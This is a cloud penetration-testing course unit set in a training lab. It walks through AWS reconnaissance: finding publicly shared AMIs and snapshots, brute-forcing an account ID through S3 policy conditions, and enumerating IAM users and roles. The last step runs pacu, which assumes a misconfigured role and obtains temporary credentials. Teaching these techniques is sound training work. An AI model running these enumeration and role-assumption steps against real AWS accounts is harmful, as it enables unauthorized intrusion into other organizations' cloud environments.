This Learning Unit covers the following Learning Objectives:

- Obtain information from publicly shared resources
- Obtain account IDs from public S3 buckets
- Enumerate IAM users in other accounts

Typically, public CSPs will enable at least two ways for customers to interact with their cloud environment.

One way is via a web application that acts as a portal for cloud services provided by the CSP. Access is protected by credentials (username, password, MFA, etc).

Another way is through APIs that allow customers to interact programmatically, integrating with custom solutions and even other cloud platforms. The API is publicly available, but requires authentication to interact with it.

In this section, we'll learn about some techniques that an attacker can use to discover more information about the target by interacting with the provider's API. In this case, the attacker creates an account in the cloud provider to receive credentials for interacting with the API.

We'll also review some examples of API abuse to obtain internal information about the target, i.e. users and roles.

## 3.1. Preparing the Lab - Configure AWS CLI

In the following sections of this Learning Unit, we'll interact with the AWS API from the command line using AWS CLI configured with the credentials that will be provided when we start the lab. Although the access keys belong to an IAM user inside the target account, we'll simulate that they belong to an attacker from an external account.

If AWS CLI is not already installed, we can easily do it in Kali using the package manager.

```
kali@kali:~$ sudo apt update
...

kali@kali:~$ sudo apt install -y awscli
...
The following NEW packages will be installed:
  awscli docutils-common python3-awscrt python3-docutils python3-jmespath python3-roman
(Reading database ... 461429 files and directories currently installed.)
...
```

> Listing 15 - Installing AWS CLI in Kali Linux

To configure the credentials in AWS CLI, we'll use a _named profile_ instead of the default. This is a good practice, since during the lab we might need to interact with AWS as other IAM users; using profiles will make it easier to differentiate one IAM from another.

We'll run the **aws --profile attacker configure** command in the terminal. This will create a profile named _attacker_. When prompted, we'll set the values of _attacker_access_key_id_ and _attacker_access_key_secret_ provided when starting the lab.

To use the profile, we'll need to add the **--profile attacker** argument to every AWS command we run. Let's test this by running the **aws --profile attacker sts get-caller-identity** command. A JSON response with the user information is proof that the credentials were valid and we are interacting with the AWS API as the _attacker_ IAM user.

```
kali@kali:~$ aws configure --profile attacker
AWS Access Key ID []: AKIAQO...
AWS Secret Access Key []: cOGzm...
Default region name []: us-east-1
Default output format []: json

kali@kali:~$ aws --profile attacker sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/attacker"
}
```

> Listing 16 - Configuring Profile and Validating Communication with AWS API

Once AWS CLI is properly configured with the _attacker_ profile, we can proceed with the following sections of the lab.

## 3.2. Publicly Shared Resources

Some cloud assets, given the nature of their function, are inherently designed to be published on the internet, such as standard operating system images (_Ubuntu_, _Debian_, etc.) that organizations use as a building block for their EC2 instance. CSPs normally provide user-friendly ways to access these.

Alternatively, some cloud resources are designed for internal use, for example, custom-built machine images or snapshots of virtual drives and databases. Despite this, large organizations might have multiple public cloud accounts and need to share these resources between accounts or even publicly.

Ideally, these publicly-shared resources won't contain sensitive data and customers should do their part of the shared responsibility model and protect their assets. However, this is not always the case.

In this section, we are going to search and discover publicly-shared resources from **offseclab.io**. We'll focus on the following commonly used resources:

- Publicly-shared [Amazon Machine Images](https://en.wikipedia.org/wiki/Amazon_Machine_Image) (AMIs)
- Publicly-shared [Elastic Block Storage](https://en.wikipedia.org/wiki/Amazon_Elastic_Block_Store) (EBS) snapshots
- [Relational Databases](https://en.wikipedia.org/wiki/Amazon_Relational_Database_Service) (RDS) snapshots

These shared resources commonly don't have a domain name or URL address to access them, so we'll need to use the CSP's API to request them.

Let's open the CLI, where we have the AWS CLI tool configured with the _attacker_'s credentials. We'll search "Publicly Shared AMIs" as an example.

AMIs are virtual machine images containing a pre-installed operating system along with software and files. To deploy an EC2 instance in AWS, we must specify an AMI. We normally choose one from the public _AMI Catalog_, which contains images publicly shared by AWS, third-party partners, community, and other accounts. Let's use AWS CLI to list all these AMIs.

Unless otherwise specified, we'll be using the _attacker_ profile, so we'll include in every command the **--profile attacker** argument.

The command **ec2 describe-images** will list all the images that the account can read. This will provide an extensive list of images as output. Let's include the **--owners amazon** argument to filter this list and show only AMIs provided by AWS.

Optionally, we can add the **--executable-users all** argument to ensure that all public AMIs will be listed, including any self-owned public AMIs.

Even filtering the results, the command below will take 30-60 seconds to complete.

```
kali@kali:~$ aws --profile attacker ec2 describe-images --owners amazon --executable-users all
{
    "Images": [
        {
            "Architecture": "x86_64",
            "CreationDate": "2022-06-29T09:46:55.000Z",
            "ImageId": "ami-0d4f490f4e62171b4",
            "ImageLocation": "amazon/Deep Learning Base AMI (Amazon Linux 2) Version 53.4",
            "ImageType": "machine",
            "Public": true,
            "OwnerId": "898082745236",
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "State": "available",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/xvda",
                    "Ebs": {
                        "DeleteOnTermination": true,
                        "Iops": 3000,
                        "SnapshotId": "snap-0ce7f231ea72dd0ea",
                        "VolumeSize": 100,
...
```

> Listing 17 - Listing All Public AMIs Owned by Amazon AWS

Instead of **--owners amazon**, we can specify any other _Account ID_ to list all the AMIs owned by that account.

We don't know the account ID of our target. However, we can leverage the filtering feature of the API to find resources.

The structure of a _filter expression_ is as follows:

```
--filters "Name=filter-name,Values=filter-value1,filter-value2,..."
```

> Listing 18 - The Filter Expression Format

_Name_ refers to the attribute of the object we want to filter and _Values_ refers to the content of that attribute. Therefore, to filter for AMIs that include the word "offseclab" in the description attribute, we'll set:

```
    -\-filters "Name=description,Values=\*Offseclab\*"
```

> Listing 19 - The Filter Expression Format for offseclab Word

We'll note that the _*Offseclab*_ value is using the wildcard _*_. This means that it will match any number of characters (including _none_ characters) at the beginning and the end surrounding the word "Offseclab".

```
kali@kali:~$ aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*Offseclab*"
{
    "Images": []
}
```

> Listing 20 - Listing All Public AMIs After Filtering the List Using the Keyword "description"

We got a response with an empty list, meaning that there were no images that matched our filter.

Another input that the user controls when creating the image is the attribute _name_, so let's try filtering by that one.

```
kali@kali:~$ aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Offseclab*"
{
    "Images": [
        {
            "Architecture": "x86_64",
            "CreationDate": "2023-08-05T19:43:29.000Z",
            "ImageId": "ami-0854d94958c0a17e6",
            "ImageLocation": "123456789012/Offseclab Base AMI",
            "ImageType": "machine",
            "Public": true,
            "OwnerId": "123456789012",
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "State": "available",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/xvda",
                    "Ebs": {
                        "DeleteOnTermination": true,
                {
                    "DeviceName": "/dev/xvda",
                    "Ebs": {
                        "DeleteOnTermination": true,
                        "DeleteOnTermination": true,
                        "SnapshotId": "snap-098dc18c797e4f255",
                        "VolumeSize": 8,
                        "VolumeType": "gp2",
                        "Encrypted": false
                    }
                }
            ],
            "EnaSupport": true,
            "Hypervisor": "xen",
            "Name": "Offseclab Base AMI",
            "RootDeviceName": "/dev/xvda",
            "RootDeviceType": "ebs",
            "SriovNetSupport": "simple",
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "Offseclab Base AMI"
                }
            ],
            "VirtualizationType": "hvm",
            "DeprecationTime": "2023-08-05T21:43:00.000Z"
        }
    ]
}
```

> Listing 21 - Listing All Public AMIs After Filtering the List Using the Keyword "name"

This time we got a match and found one AMI. We also got the account ID that most likely belongs to the target organization. With the account ID, we can search for more AMIs or other resources; we'll leave that as an exercise for the end of this section.

Similarly, we can seek publicly-shared _EBS snapshots_ using the **ec2 describe-snapshots** command.

```
kali@kali:~$ aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*offseclab*"
{
    "Snapshots": []
}
```

> Listing 22 - Listing Public Snapshots After Filtering the List Using the Keyword "description"

We couldn't find any other resource, but we can get an idea of how to use the CSP's API features to search for publicly-shared resources.

There isn't a golden rule for this, though. The search will depend on the type of resource, the service API, the public CSP, etc. The best way to approach this is to investigate publicly-exposable resources in specific CSPs (e.g. [AWS](https://github.com/SummitRoute/aws_exposable_resources)) and consult the documentation for the services we want to try.

Finding these type of resources widens the attack surface and opens new attack vectors to try. For instance, with the AMI found in **offseclab.io**, we can try launching an EC2 instance with that image and searching for more sensitive data. Even if we don't find sensitive info that can give us direct access to the cloud infrastructure, we still can learn more about our target.

#### Labs

1. Use the _account ID_ to search for other publicly shared resources. You will find a 1 GB-sized snapshot (VoumeSize: 1). Copy the description of the newly found resource and paste it into the answer box. (This resource is not really publicly shared, but we should be able to list it with the provided credentials for the lab.)

Answer

## 3.3. Obtaining Account IDs from S3 Buckets

In the previous section, we discovered the AWS account ID of the target by finding publicly-shared resources through the AWS API. In this case, we'll assume that there are no publicly shared resources, so we can't get the account ID that way.

In this section, we'll learn a technique for how we can abuse the API features and capabilities to obtain the target's account ID from a publicly-shared S3 bucket or object.

We'll begin by creating an IAM user that, by default, won't have any permissions to execute actions. Then we'll add a policy to grant _read_ access to the bucket with the _Condition_ that the permission will only apply if the account ID that owns the bucket starts with the digit "x". If we can't read the bucket, we'll keep trying with other numbers until we are able to read the bucket, showing we've identified the first digit of the account ID where the bucket resides. We can iterate through the other digits until we retrieve all the account IDs.

First, we'll choose a publicly-readable bucket or object inside the target account. Because the bucket/object is publicly-readable, we should be able to list the content of it with any IAM user of any AWS account. In the lab, we'll choose one of the publicly-readable buckets.

Then, we'll create a new IAM user in our _attacker_ account. By default, IAM users don't have any permissions to execute any actions, so the new user won't be able to list the content of the public resource even when it's public.

Next, we'll create a policy that will grant permissions to _list buckets_ and _read objects_. However, we'll add the _Condition_ that the _read_ permission will only apply if the account ID that owns the bucket starts with the digit "x".

After we apply the policy to the new IAM user, let's test if we can list the bucket with the new user's credentials. We'll test the value _x_ from 0 to 9 until we can list the bucket, meaning that we found the first digit of the account.

![[OffSec/Cloud/Public Cloud Reconnaissance - External Probing/z. images/6a0d4545905de8be1e82b266fb887cb5_MD5.gif]]

Figure 8: Getting AccountID from a Public S3 Bucket or Object

This technique is tailored for AWS. However, it shows how APIs can be exploited to retrieve information beyond their intended purpose, a tactic that can be relevant in various platforms and contexts.

Let's check how this works in our lab. We can use the _offseclab-assets-public-..._ bucket, which is publicly-readable. If it wasn't readable, we could also use a publicly-readable object on the bucket, such as any of the images of the website.

To begin, let's retrieve the bucket name again.

The bucket name has a random string that changes every time we restart the lab. We need to check the new name every time we restart the lab.

We can browse the website [**www.offseclab.io**](http://www.offseclab.io) and get the bucket name from the URL of any of the images in the website as we did previously. This time, however, we will use _curl_ to perform this task.

First, we'll get the source code in HTML of the main site using **curl -s www.offseclab.io**. The **-s** flag will omit the loading statistic lines that curl outputs by default.

In our next step, we'll pipe the output to **grep** to filter out a particular string or pattern, aiming to extract the bucket's name. This bucket's name begins with the prefix "offseclab-assets-public-" and is followed by a random sequence of eight alphanumeric characters. This is represented as the regular expression offseclab-assets-public-\w{8}. The **-P** flag instructs grep to interpret the pattern using _perl-regexp_ syntax. Since the default behavior of grep is to display the entire line where the pattern is found, we'll use **-o** to display just the matched portion.

```
kali@kali:~$ curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
```

> Listing 23 - Getting the Name of the Public Bucket with curl

The output shows four matches, one for every image in the homepage source code. We can copy the bucket name from the output.

Last time, we validated that the bucket was publicly-accessible by listing the content in the web browser. We'll use the AWS CLI tool this time. To list the content of the bucket, we can use the **s3 ls** command.

```
kali@kali:~$ aws --profile attacker s3 ls offseclab-assets-public-kaykoour
                           PRE sites/
```

> Listing 24 - Listing the Public Bucket as the attacker

Ideally, we are running this command from our own AWS account, so it's safe to assume that the bucket probably has an ACL or policy that grants _read_ access to all accounts.

Now, let's create a new IAM user with the **iam create-user --user-name enum** command. Let's keep in mind that this user resides in the _attacker-controlled_ AWS account.

Next, we'll also create access keys for the IAM user, so we can interact as this user with the AWS API through the AWS CLI tool. We'll run the **iam create-access-key --user-name enum** command and take note of the _AccessKeyId_ and _SecretAccessKey_ in the output.

```
kali@kali:~$ aws --profile attacker iam create-user --user-name enum
{
    "User": {
        "Path": "/",
        "UserName": "enum",
        "UserId": "AIDAQOMAIGYU4HTPEJ32K",
        "Arn": "arn:aws:iam::123456789012:user/enum",
    }
}

kali@kali:~$ aws --profile attacker iam create-access-key --user-name enum
{
    "AccessKey": {
        "UserName": "enum",
        "AccessKeyId": "AKIAQOMAIGYURE7QCUXU",
        "Status": "Active",
        "SecretAccessKey": "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",
    }
}
```

> Listing 25 - Creating the IAM User "enum" and Generating AccessKeyId and SecretAccessKey for that User

To interact as the new IAM user, we'll create a profile in the AWS CLI with the newly-created access keys. We'll run **aws configure --profile enum** and input the _Access Key ID_ and _Secret Access Key_.

Once the profile is created, we just need to add the **--profile enum** argument to every command we want to run as the _enum_ user. Let's try this by running **aws sts get-caller-identity --profile enum**. This will return the _UserId_, _Account_, and _ARN_ (Amazon Resource Name) of the identity interacting with the API.

```
kali@kali:~$ aws configure --profile enum
AWS Access Key ID [None]: AKIAQOMAIGYURE7QCUXU
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: json

kali@kali:~$ aws sts get-caller-identity --profile enum
{
    "UserId": "AIDAQOMAIGYU4HTPEJ32K",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/enum"
}
```

> Listing 26 - Configuring AWS CLI with Profile "enum"

Newly-created users with no policies attached are almost fully restricted from accessing any resource, even listing public buckets in other AWS accounts. However, we can provide access by creating a policy that allows a very specific action, such as listing a public bucket. If we add a condition that checks if the account number owning the S3 bucket starts with a specific number, we can enumerate and extract the account number.

Before proceeding, we need to address a key difference between our lab environment and a real attack. In a real attack, the _enum_ user resides in the attacker's AWS Account. In our lab environment, both the _enum_ user and the target bucket are on the same AWS account. We'll pretend that they are in different accounts. However, this forces us to slightly change the exploit. Instead of listing the public bucket, we'll list the private bucket. The reason for this is that even though an IAM user doesn't have a policy attached granting permission to list buckets, the user can still read the public buckets in the same account the user resides in. This is expected behavior with the AWS API.

The rest of the exploit works the same. We only need to list the private bucket instead of the public bucket. This will simulate an attacker enumerating from a different AWS account.

![[OffSec/Cloud/Public Cloud Reconnaissance - External Probing/z. images/d3bc2bc9acbff9b848beea380746fc89_MD5.jpg]]

Figure 9: Getting AccountID from a Public S3 Bucket or Object. Lab Modification

Because the new _enum_ user has no policies yet, it will _Deny ALL actions_ by default. This means that if we try to list the content of the bucket again with this user, we'll receive an _AccessDenied_ error.

```
kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  
```

> Listing 27 - Listing the Private Bucket with the enum User

Now, let's write a policy that will allow for listing the content of the bucket and reading objects inside it.

We'll name the policy document **policy-s3-read.json**.

```
# policy-s3-read.json
{
     "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
    ]
}
```

> Listing 28 - Policy to Allow Listing Buckets and Reading Objects

We can use our favorite text editor to write the policy. In the example below, we use **nano**. After copying and pasting the content of the policy, we'll display it again and analyze it.

```
kali@kali:~$ nano policy-s3-read.json

kali@kali:~$ cat -n policy-s3-read.json 
     1  {
     2      "Version": "2012-10-17",
     3      "Statement": [
     4          {
     5              "Sid": "AllowResourceAccount",
     6              "Effect": "Allow",
     7              "Action": [
     8                  "s3:ListBucket",
     9                  "s3:GetObject"
    10              ],
    11              "Resource": "*",
    12              "Condition": {
    13                  "StringLike": {"s3:ResourceAccount": ["0*"]}
    14              }
    15          }
    16      ]
    17  }

```

> Listing 29 - Creating the policy document file

The policy allows (line 6) to _list buckets_ (line 8) and _read any object_ in the buckets (line 9). There is a _*_ wildcard in the _Resource_ attribute (line 11) meaning that the actions are allowed for any bucket and object in any account. On lines 12-14, we add a condition to make this policy valid only if the account ID hosting the resource (_ResourceAccount_) starts with "0" following "any other digits" (using the wildcard for this).

We'll associate this policy with the _enum_ IAM user with an inline policy using the **iam put-user-policy** command.

Using the **--user-name enum** argument, we can specify the name of the IAM user.

The **--policy-name** argument lets us set a name for the policy. This is just for reference. We'll name the policy _s3-read_.

The **--policy-document** argument expects a string with the policy in JSON format. The prefix **file://** instructs the tool to read the policy from **policy-s3-read.json**.

The command will not return output if the policy was successfully applied. However, we can verify it using the **iam list-user-policies --user-name enum** command.

```
kali@kali:~$ aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json

kali@kali:~$ aws --profile attacker iam list-user-policies --user-name enum
{
    "PolicyNames": [
        "s3-read"
    ]
}
```

> Listing 30 - Attaching the s3-read Inline Policy to the enum IAM User

According to the policy we set, the user will be able to read the content of the bucket only if the account ID where the bucket resides starts with "0". In our lab, our account is "123456789012". It doesn't start with "0", so we'll get an _AccessDenied_ error when trying to list the bucket.

If we change the policy in the file and apply it again to the _enum_ user, we'll be able to list the bucket. This time it works because our account starts with the digit "1".

Policies take a few seconds to be active after they are applied, so we might need to wait 10-15 seconds each time we test.

We can run **aws --profile attacker sts get-caller-identity** to retrieve the account ID of our lab. This will help us validate our technique.

```
kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  

kali@kali:~$ nano policy-s3-read.json

kali@kali:~$ cat -n policy-s3-read.json 
     1  {
     2      "Version": "2012-10-17",
     3      "Statement": [
     4          {
     5              "Sid": "AllowResourceAccount",
     6              "Effect": "Allow",
     7              "Action": [
     8                  "s3:ListBucket",
     9                  "s3:GetObject"
    10              ],
    11              "Resource": "*",
    12              "Condition": {
    13                  "StringLike": {"s3:ResourceAccount": ["1*"]}
    14              }
    15          }
    16      ]
    17  }

kali@kali:~$ aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json

kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
                           PRE sites/
```

> Listing 31 - Changing the Condition in the Policy and Testing Again

Once we know that the policy starts with a digit, we can move to the next one by modifying the condition of the policy like so:

```
- __"StringLike": {"s3:ResourceAccount": ["10*"]}__
- __"StringLike": {"s3:ResourceAccount": ["11*"]}__
...
- __"StringLike": {"s3:ResourceAccount": ["18*"]}__
- __"StringLike": {"s3:ResourceAccount": ["19*"]}__
```

> Listing 32 - Modifying the Policy Condition Statement to Brute Force the AccountID

We can automate this process programmatically and build an application to obtain the account ID from a publicly-accessible bucket or object.

Tools such as [_s3-account-search_](https://github.com/WeAreCloudar/s3-account-search) also implement this technique, although this one uses _roles_ instead of _users_ to link the policy to the condition.

As we can observe, there are several ways to implement this. The key concept is leveraging the "Condition" feature of the IAM policies to control the _cross-account_ access. We used S3 because it's more common to find publicly-readable S3 objects than other resources, but theoretically, we can use this technique with other services as well.

## 3.4. Enumerating IAM Users in Other Accounts

In the previous section, we examined a case where the API was misused to obtain the account ID of a target. In this section, we will continue to build upon the previous lab. We'll learn about another example of API abuse that enumerates _internal IAM identities_ when we know the AWS account ID of the target.

Previously, we leveraged resources that had either publicly accessible permissions or, at the very least, permissions that granted _read_ access to the _attacker's_ account. We need to be aware of the latter because an important concept in this case is that sometimes we want a cloud resource to be publicly available on the internet, but at other times, we may want a resource to be accessible only to specific accounts. In AWS, this is referred to as [**cross-account access**](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic-cross-account.html).

To configure cross-account access through IAM policies, we can specify both the account that will be granted access and the IAM identity (_User_, _Group_, or _Role_) within that account. If the identity does not exist, it will throw an _error_ when trying to apply that policy.

To grant access to an identity in a different account, we need to create a policy and configure the _Principal_ attribute, which will contain the IAM identity in a specific account. AWS will validate the existence of the identity and will return an _error_ if it doesn't exist.

Typically, we use the _AWS Resource Name_ (ARN) to specify an IAM identity, as shown below:

```
"Principal": {
  "AWS": ["arn:aws:iam::AccountID:user/user-name"]
}
```

> Listing 33 - Example of a Principal Definition Inside a policy

The identity's ARN follows a standard format. We can craft it by modifying the Account's ID and the IAM user's username. So, for example, if the attacker wants to test if the _cloudadmin_ user exists in the account 123456789012, then the _Principal_ definition of the policy should be:

```
"Principal": {
  "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
}
```

> Listing 34 - Example of a Principal Definition Specifying the ARN of an IAM user

The attacker can then apply/attach this policy to a resource and if it fails, it means that the user doesn't exist.

Let's observe how this works in our lab.

In the previous section, we already retrieved the account ID of the target's AWS account. The account will change after restarting the lab. We can either repeat the technique or we can get the account in the info box after starting the lab.

First, let's create an S3 bucket inside our _attacker_'s account. The command **aws s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM** will create a bucket with the name _offseclab-dummy-bucket_, followed by random integer values to ensure that the bucket name is unique.

```
kali@kali:~$ aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM
make_bucket: offseclab-dummy-bucket-28967-25641-13328
```

> Listing 35 - Creating a S3 Bucket in the attacker's Account

By default, the newly-created bucket is _private_. Now we are going to define a policy document in which we'll grant _read_ permission only to a specific IAM user in the target account. We can use any text editor of our preference to write the policy. We'll use the ARN we crafted earlier to test if the _cloudadmin_ user exists in the account 123456789012.

```
kali@kali:~$ nano grant-s3-bucket-read.json

kali@kali:~$ cat grant-s3-bucket-read.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}
```

> Listing 36 - Policy Granting Permission to List the Bucket to a Single IAM User

Now that we have our policy document, we are ready to attach it to the bucket using the **aws s3api put-bucket-policy** command.

The **--bucket** flag specifies the name of the S3 bucket to which the policy should be applied. In this case, the name of the bucket is _offseclab-dummy-bucket-28967-25641-13328_.

The **--policy file://grant-s3-bucket-read2.json** argument specifies the policy that will be attached. Because our policy is defined in **grant-s3-bucket-read2.json**, we must use the prefix **file://** to instruct AWS CLI to read the policy from that file.

If no error returns after running the command, our policy was applied successfully. This also means that the _cloudadmin_ user exists in the target account.

```
kali@kali:~$ aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json 

kali@kali:~$ 
```

> Listing 37 - Attaching the Resource Based Policy to the Test Bucket

Next, let's copy the policy to create a new one - but this time, we'll grant privileges to a _nonexistent principal_.

```
kali@kali:~$ cp grant-s3-bucket-read.json grant-s3-bucket-read-userDoNotExist.json

kali@kali:~$ nano grant-s3-bucket-read-userDoNotExist.json

kali@kali:~$ cat grant-s3-bucket-read-userDoNotExist.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/nonexistant"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}

kali@kali:~$ aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328  --policy file://grant-s3-bucket-read-userDoNotExist.json 

An error occurred (MalformedPolicy) when calling the PutBucketPolicy operation: Invalid principal in policy
```

> Listing 38 - Editing the Policy Specifying a Non-existing User and Testing Again

When we tried to attach a _resource-based_ policy to a bucket granting permissions to a _Principal_ that does not exist, it returns an error message stating _'Invalid principal in policy'_. The error message may mislead one to think that there is something wrong with the definition of the principal in the policy, but this actually occurs because the API couldn't internally validate the existence of the principal.

We can automate this process to obtain a valid enumeration technique that will indicate whether a _Principal_ exists. In our example, we checked the existence of an IAM user, but we can also define other principals such as _groups_ and _roles_.

The concept of abusing the API to enumerate users in another account can be applied using _roles_ and the _AssumeRole_ action. When we create a role, we need to set a trust policy that specifies the principals that will have permission to assume that role. Similarly, as it happened with the resource-based policy of the S3 bucket, an error will occur if the _Principal_ does not exist.

Let's suppose we have a large list of potential role names we want to test by brute forcing this enumeration technique. For this lab, we'll limit our list to a few options. This approach not only saves time, but also considers that our demonstration is conducted against an authentic service provider. Let's create a list of 10 potential role names we want to try. Typically, we'd attempt to find roles related to the target activities. We can even use AI tools to help build a more extensive list.

```
kali@kali:~$ echo -n "lab_admin
security_auditor
content_creator
student_access
lab_builder
instructor
network_config
monitoring_logging
backup_restore
content_editor" > /tmp/role-names.txt
```

> Listing 39 - Creating a List of Roles to Search in the Account

In this case, we'll use a popular tool named [_pacu_](https://www.kali.org/tools/pacu/) that can automate this technique of user and role enumeration. This tool is available in Kali's official repositories and can be installed by running the following commands:

```
kali@kali:~$ sudo apt update

kali@kali:~$ sudo apt install pacu
```

> Listing 40 - Installing pacu in Kali Linux Using the Package Manager

After installation completes, we'll be ready to use the tool. We can run **pacu -h** to display the usage help. This will also verify that the tool is successfully installed.

```
kali@kali:~$ pacu -h                                     
usage: pacu [-h] [--session] [--activate-session] [--new-session] [--set-keys] [--module-name] [--data] [--module-args]
            [--list-modules] [--pacu-help] [--module-info] [--exec] [--set-regions  [...]] [--whoami]

options:
  -h, --help            show this help message and exit
  --session             <session name>
  --activate-session    activate session, use session arg to set session name
  --new-session         <session name>
  --set-keys            alias, access id, secrect key, token
  --module-name         <module name>
  --data                <service name/all>
  --module-args         <--module-args='--regions us-east-1,us-east-1'>
  --list-modules        List arguments
  --pacu-help           List the Pacu help window
  --module-info         Get information on a specific module, use --module-name
  --exec                exec module
  --set-regions  [ ...]
                        <region1 region2 ...> or <all> for all
  --whoami              Display information on current IAM user
```

> Listing 41 - Getting the pacu Usage Help

Next, we'll run **pacu** without any other argument to start it in interactive mode. Pacu separates the assessment in _sessions_. The first time we run pacu, it will prompt for a name to create a session. Let's create a session and name it _offseclab_.

Once the session is created, it will display a list of available commands and, eventually, we'll get a new command prompt showing that we are in interactive mode within the _offseclab_ session.

```
kali@kali:~$ pacu

....
Database created at /root/.local/share/pacu/sqlite.db

What would you like to name this new session? offseclab
Session offseclab created.

...

Pacu (offseclab:No Keys Set) > 
```

> Listing 42 - Starting pacu in Interactive Mode

First, we'll notice the message _No Keys Set_ in the prompt. We can quickly set keys from the AWS CLI credentials file with the **import-keys** command. We can specify the profile configured in AWS CLI. Let's import the _attacker_ profile. We can also check that the command prompt changed, showing that now we have available keys.

```
Pacu (offseclab:No Keys Set) > import_keys attacker
  Imported keys as "imported-attacker"
Pacu (offseclab:imported-attacker) > 

```

> Listing 43 - Importing the attacker Profile Credentials in pacu

Pacu implements modules to conduct different types of assessments against AWS accounts. We can list all the available modules with the **ls** command.

Most of the modules require credentials in the target account. We'll browse through the list of modules and search for the _Recon_UNAUTH_ category. We are interested in the one that seems related to enumerating roles.

```
Pacu (offseclab:imported-attacker) > ls
...
[Category: RECON_UNAUTH]

  iam__enum_roles
  iam__enum_users

...
```

> Listing 44 - Listing Modules in pacu

To display information about the module, we need to add the **help** command following the name of the module. Let's learn more about the _iam__enum_roles_ module.

```
Pacu (offseclab:imported-attacker) > help iam__enum_roles

iam__enum_roles written by Spencer Gietzen of Rhino Security Labs.

usage: pacu [--word-list WORD_LIST] [--role-name ROLE_NAME] --account-id
            ACCOUNT_ID

This module takes in a valid AWS account ID and tries to enumerate existing
IAM roles within that account. It does so by trying to update the
AssumeRole policy document of the role that you pass into --role-name if
passed or newlycreated role. For your safety, it updates the policy with an
explicit deny against the AWS account/IAM role, so that no security holes
are opened in your account during enumeration. NOTE: It is recommended to
use personal AWS access keys for this script, as it will spam CloudTrail
with "iam:UpdateAssumeRolePolicy" logs and a few "sts:AssumeRole" logs. The
target account will not see anything in their logs though, unless you find
a misconfigured role that allows you to assume it. The keys used must have
the iam:UpdateAssumeRolePolicy permission on the role that you pass into
--role-name to be able to identify a valid IAM role and the sts:AssumeRole
permission to try and request credentials for any enumerated roles.
...
```

> Listing 45 - Displaying Information About iam__enum_roles Module in pacu

The output returned more information about the module, including usage instructions and details of the arguments that we can send.

The **--account-id** is a required flag that specifies the target's _AccountID_ where we'll enumerate the roles.

The **--word-list** flag let us specifies the wordlist of roles to try. We'll use the list that we already created in **/tmp/role-names.txt**.

This module requires an existing role in the _attacker_'s account. If we don't specify a role, the tool will create a temporary role (assuming that the credentials in the _attacker_ account have the permissions to run that action). We'll let the tool create a role for us, therefore we won't use the **--role-name** flag.

We can use a module with the **run** command, followed by the name of the module and any other argument that we need to pass.

```
Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012
  Running module iam__enum_roles...
...

[iam__enum_roles] Targeting account ID: 123456789012

[iam__enum_roles] Starting role enumeration...


[iam__enum_roles]   Found role: arn:aws:iam::123456789012:role/lab_admin

[iam__enum_roles] Found 1 role(s):

[iam__enum_roles]     arn:aws:iam::123456789012:role/lab_admin

[iam__enum_roles] Checking to see if any of these roles can be assumed for temporary credentials...

[iam__enum_roles]   Role can be assumed, but hit max session time limit, reverting to minimum of 1 hour...

[iam__enum_roles]   Successfully assumed role for 1 hour: arn:aws:iam::123456789012:role/lab_admin

[iam__enum_roles] {
  "Credentials": {
    "AccessKeyId": "ASIAQOMAIGYUWZXRMMO2",
    "SecretAccessKey": "2UU80dtizqx3DUa9mn6033AjXKb13GXOMCy+tOUt",
    "SessionToken": "FwoGZXIvYXdzEO///////////wEaDCv5...",
    "Expiration": "2023-08-18 22:07:49+00:00"
  },
  "AssumedRoleUser": {
    "AssumedRoleId": "AROAQOMAIGYUR5KMGWT7V:dCkQ0O1y6n9KSQmGBaKJ",
    "Arn": "arn:aws:sts::123456789012:assumed-role/lab_admin/dCkQ0O1y6n9KSQmGBaKJ"
  }
}
